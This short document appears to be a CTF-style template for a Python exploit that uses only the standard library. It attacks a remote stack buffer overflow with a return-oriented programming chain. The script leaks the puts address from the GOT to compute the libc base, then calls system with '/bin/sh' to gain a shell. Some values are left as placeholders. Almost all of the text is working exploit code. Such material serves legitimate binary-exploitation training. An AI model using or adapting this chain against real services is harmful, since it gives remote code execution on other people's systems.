# The exploit script — the stdlib template


No pwntools — the script is stdlib:

    import socket, struct
    p = lambda x: struct.pack('<Q', x)

    HOST, PORT = 'host', 1337
    offset = 72                 # measured
    pop_rdi = 0x401236          # from /R or --gadgets
    got_puts = 0x404018         # from readelf -r
    plt_puts = 0x401030         # from the PLT disasm
    main = 0x4011c0             # from afl

    s = socket.create_connection((HOST, PORT))
    s.recv(1024)                # the prompt
    s.send(b'A'*offset + p(pop_rdi) + p(got_puts) + p(plt_puts) + p(main) + b'\n')
    leak = struct.unpack('<Q', s.recv(1024).split(b'\n')[0].ljust(8,b'\x00'))[0]
    libc_base = leak - PUTS_OFFSET
    s.send(b'A'*offset + p(pop_rdi) + p(libc_base+BINSH) + p(RET) + p(libc_base+SYSTEM) + b'\n')
    # interact
